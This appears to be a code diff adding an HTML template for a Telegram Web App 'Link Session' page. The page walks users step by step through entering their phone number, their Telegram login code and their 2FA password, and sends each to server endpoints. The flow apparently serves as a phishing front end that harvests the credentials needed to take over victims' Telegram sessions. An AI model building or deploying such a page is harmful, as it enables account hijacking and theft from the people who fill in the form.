@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Link Session</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+       font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0b0f19;color:#e8ecf4}
+  video.bg{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;opacity:.3}
+  .card{position:relative;width:min(400px,93vw);padding:26px;border-radius:16px;
+        background:rgba(18,24,38,.94);border:1px solid #24304a}
+  h1{font-size:19px;margin:0 0 6px}
+  p.muted{color:#8b9ab5;font-size:13px;margin:0 0 16px}
+  input{width:100%;padding:12px;border-radius:10px;border:1px solid #2c3a58;background:#0f1524;
+        color:#fff;font-size:15px;margin-bottom:10px}
+  button{width:100%;padding:12px;border:0;border-radius:10px;background:#3b82f6;color:#fff;
+         font-weight:600;font-size:15px;cursor:pointer;margin-bottom:8px}
+  button.gray{background:#2b3650}
+  .err{color:#ff8080;font-size:13px;margin-bottom:10px}
+  .ok{color:#7ee2a8;font-size:13px;margin-bottom:10px}
+  .hide{display:none}
+</style>
+</head>
+<body>
+{% if bg_video %}<video class="bg" src="{{ bg_video }}" autoplay muted loop playsinline></video>{% endif %}
+<main class="card">
+  <h1>Link your session</h1>
+  <p class="muted">Apna number daalo, code aayega, phir 2FA (agar hai).</p>
+  <div id="msg"></div>
+
+  <div id="step-phone">
+    <input id="phone" type="tel" placeholder="+919999999999" autocomplete="tel">
+    <button onclick="sendCode()">Send code</button>
+  </div>
+
+  <div id="step-code" class="hide">
+    <input id="code" type="text" inputmode="numeric" placeholder="12345">
+    <button onclick="verify()">Verify</button>
+    <button class="gray" onclick="resend()">Resend code</button>
+  </div>
+
+  <div id="step-pw" class="hide">
+    <input id="pw" type="password" placeholder="2FA password">
+    <button onclick="sendPw()">Submit password</button>
+  </div>
+
+  <div id="step-done" class="hide">
+    <p class="ok">Linked successfully.</p>
+  </div>
+</main>
+
+<script>
+try { if (window.Telegram && Telegram.WebApp) Telegram.WebApp.ready(); } catch (e) {}
+const msg = document.getElementById('msg');
+function show(el) { ['step-phone','step-code','step-pw','step-done'].forEach(i =>
+  document.getElementById(i).classList.toggle('hide', i !== el)); }
+function say(t, ok) { msg.innerHTML = '<p class="' + (ok ? 'ok' : 'err') + '">' + t + '</p>'; }
+
+async function post(path, body) {
+  const r = await fetch(path, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(body) });
+  const d = await r.json();
+  if (!r.ok || d.success === false) throw new Error(d.error || 'failed');
+  return d;
+}
+const phone = () => document.getElementById('phone').value.trim();
+
+async function sendCode() {
+  say('');
+  try { const d = await post('/api/send-code', { phone: phone() });
+        show(d.state === 'password' ? 'step-pw' : 'step-code'); }
+  catch (e) { say(e.message); }
+}
+async function verify() {
+  say('');
+  try {
+    const d = await post('/api/verify', { phone: phone(), code: document.getElementById('code').value });
+    if (d.state === 'password') show('step-pw');
+    else { show('step-done'); say(''); }
+  } catch (e) { say(e.message); }
+}
+async function sendPw() {
+  say('');
+  try { await post('/api/password', { phone: phone(), password: document.getElementById('pw').value });
+        show('step-done'); }
+  catch (e) { say(e.message); }
+}
+async function resend() {
+  say('');
+  try { await post('/api/resend', { phone: phone() }); say('Code resent', true); }
+  catch (e) { say(e.message); }
+}
+</script>
+</body>
+</html>
